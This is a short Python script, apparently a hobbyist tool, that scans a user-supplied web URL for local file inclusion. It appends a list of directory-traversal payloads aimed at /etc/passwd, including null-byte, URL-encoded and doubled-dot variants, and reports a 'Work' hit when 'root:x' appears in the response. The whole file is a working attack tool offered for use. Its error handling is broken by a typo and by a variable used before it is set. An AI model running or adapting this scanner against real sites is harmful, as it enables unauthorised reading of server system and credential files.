import requests
import threading
import time
import colorama
def test():
  print("This short code writed By saadalhrby ")
  print("This is only /etc/passwd checker")
  print("put url like this http://example.com/index.php?page=")
  r =input("Enter ur url :")
  y =["../etc/passwd","/etc/passwd","etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../etc/passwd" ,"../../etc/passwd","../../../etc/passwd","../../../../../etc/passwd","/etc/passwd%00","../../etc/passwd%00","../etc/passwd%00","../../../etc/passwd%00","/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd","....//....//etc/passwd","....//etc/passwd"]
  for lfi in y:
    try:
      req =requests.get(r + lfi)
    except:
      priny("something error" ,req.url)
    else:
      if "root:x" in req.text:
        print(colorama.Fore.BLUE ,"++ Work +++" ,req.url)
      else:
        print(colorama.Fore.RED ,"--- Failed exploit ---" ,req.url)
threading.Thread(target=test).start()
time.sleep(0.1)
